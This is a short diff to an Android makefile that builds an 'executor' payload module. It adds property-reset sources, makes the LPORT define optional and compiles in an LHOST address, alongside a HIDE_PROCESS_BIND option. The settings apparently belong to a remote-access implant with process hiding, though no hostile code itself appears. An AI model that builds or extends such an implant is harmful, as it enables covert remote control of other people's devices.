@@ -90,15 +90,21 @@ ifdef B_EXECUTOR
 
 LOCAL_MODULE := executor
 
-LOCAL_STATIC_LIBRARIES := libutils
+LOCAL_STATIC_LIBRARIES := libnanopb libsystemproperties libutils
 
 LOCAL_C_INCLUDES := \
     jni/include \
     out
 
-LOCAL_SRC_FILES := payload/executor.cpp
+LOCAL_SRC_FILES := payload/executor.cpp \
+                   resetprop/resetprop.cpp \
+                   resetprop/persist_properties.cpp
 
-LOCAL_CPPFLAGS += -DLPORT=\"$(LPORT)\" -DLHOST=\"$(LHOST)\"
+ifdef LPORT
+LOCAL_CPPFLAGS += -DLPORT=\"$(LPORT)\"
+endif
+
+LOCAL_CPPFLAGS += -DLHOST=\"$(LHOST)\"
 
 ifdef HIDE_PROCESS_BIND
 LOCAL_CPPFLAGS += -DHIDE_PROCESS_BIND
